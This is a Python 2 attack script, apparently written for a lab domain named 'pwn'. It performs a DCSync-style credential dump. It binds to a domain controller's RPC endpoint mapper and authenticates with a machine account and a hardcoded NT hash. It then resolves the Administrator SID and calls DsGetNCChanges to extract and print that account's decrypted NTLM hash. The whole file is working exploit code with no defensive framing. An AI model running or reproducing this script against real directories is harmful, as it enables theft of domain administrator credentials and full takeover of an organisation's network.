from hexdump import hexdump

import struct
import libdcerpc
import epmap
import drsuapi

import re
def uuid_to_bin(uuid):
    m = re.match('([\da-fA-F]{8})-([\da-fA-F]{4})-([\da-fA-F]{4})-([\da-fA-F]{4})-([\da-fA-F]{4})([\da-fA-F]{8})', uuid)

    (uuid1, uuid2, uuid3, uuid4, uuid5, uuid6) = [int(x, 16) for x in m.groups()]

    uuid = struct.pack('<LHH', uuid1, uuid2, uuid3)
    uuid += struct.pack('>HHL', uuid4, uuid5, uuid6)

    return uuid

EPMv4_UUID = u'E1AF8308-5D1F-11C9-91A4-08002B14A0FA'
DRSUAPI_UUID = (u'e3514235-4b06-11d1-ab04-00c04fc2dcd2', u'4.0')

ip = '192.168.1.95'

username = 'matrix$'
password = '31d6cfe0d16ae931b73c59d7e0c089c0'
#password = ''
domain = 'pwn'

sid = u'S-1-5-21-1770311021-3012853034-876137281-500'

x =  drsuapi.drs_get_hashes_from_guid('192.168.1.95', \
                [sid], \
                'matrix$', password, domain=domain)

print x
print('*'*20)

#binding = 'ncacn_ip_tcp:%s[%d]' % (ip, 135)
binding_dict = {}
binding_dict['ip'] = ip
binding_dict['tcp'] = 135

ept = epmap.EPTClient(binding_dict)
ept.ept_bind()
ept_port = ept.ept_negotiation(DRSUAPI_UUID[0], DRSUAPI_UUID[1])
#ept._ept_map(DRSUAPI_UUID[0], DRSUAPI_UUID[1])

print ept_port
#_ = __('192.168.1.95')
drs = drsuapi.DRSUAPIClient(ip)
drs.set_credentials(username, password, use_krb5=None, kerberos_db=False)

drs.raw_bind(ept.get_endpoint(ept_port))
drs.ds_bind()

infos_domain = drs.ds_get_domain_controller_info(domain=domain)

#print infos_domain
NtdsDsaObjectGuid = infos_domain['NtdsDsaObjectGuid']

names = drs.ds_crack_names(names=[sid], out_format=drsuapi.DS_UNIQUE_ID_NAME, raw_return=True)
#print('get_reply of dscracknames\n')

print names.__dict__

#print names['pmsgOut']['pResult'].items[0]
name = names['pmsgOut']['pResult'].items[0]['pName'].get_string().decode('utf-16le')[:-1]
name = unicode(name[1:-1])
print name
x = uuid_to_bin(name)

print repr(x)

try:
    string_name, changes = drs.ds_get_nc_changes_2(NtdsDsaObjectGuid=NtdsDsaObjectGuid,
                                    #username='Administrator',
                                    guid = x,
                                    rid=500)
    print "NTLM: %s" % changes['decrypted_NTLM'].encode('hex')
except Exception, e:
    print e











